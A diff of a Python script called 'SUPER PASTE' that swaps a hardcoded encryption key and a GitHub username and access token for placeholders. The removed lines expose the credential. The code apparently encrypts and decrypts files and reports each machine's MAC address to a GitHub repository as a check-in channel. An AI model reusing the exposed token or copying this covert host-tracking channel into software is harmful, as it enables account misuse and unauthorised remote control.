@@ -14,7 +14,7 @@ import pyperclip as pc
 import pyfiglet
 import sys
 
-k="bImD4glbqcfVl7EyyTVJxqc6N_bdu6UR_yDte2tqerU="
+k="key"
 global tDirs
 global tFiles
 ascii_banner = pyfiglet.figlet_format("SUPER PASTE")
@@ -49,8 +49,8 @@ def decrypt(filename, key):
         file.write(decrypted_data)
 
 def release_issue():
-    g = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
-    repo=g.get_user().get_repo("UPDATE1")    
+    g = Github("USERNAME", "AUTH-TOKEN")
+    repo=g.get_user().get_repo("REPO NAME")    
     mac = get_mac()
     repo.create_file(str(mac)+".txt", "FILE_CREATED", "")
 
@@ -68,17 +68,17 @@ def fileInRepo(repo, path_to_file):
     return path_to_file in rsub
 
 def git_up(msg,content):
-    g = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
-    repo=g.get_user().get_repo("UPDATE1")
+    g = Github("USERNAME", "AUTH-TOKEN")
+    repo=g.get_user().get_repo("REPO NAME")
     mac=get_mac()
     file = repo.get_contents(str(mac)+".txt")
     repo.update_file(str(mac)+".txt", msg, content, file.sha)
 
 
 def get_hub():
-    github = Github("ashfaquekhan", "f8d66aac85299f6ef03b8a4271a13bcec4f2c04c")
+    github = Github("USERNAME", "AUTH-TOKEN")
     user = github.get_user()
-    repository = user.get_repo("UPDATE1")
+    repository = user.get_repo("REPO NAME")
     mac= get_mac()
     file_content = repository.get_contents(str(mac)+".txt")
     chek = file_content.decoded_content.decode()
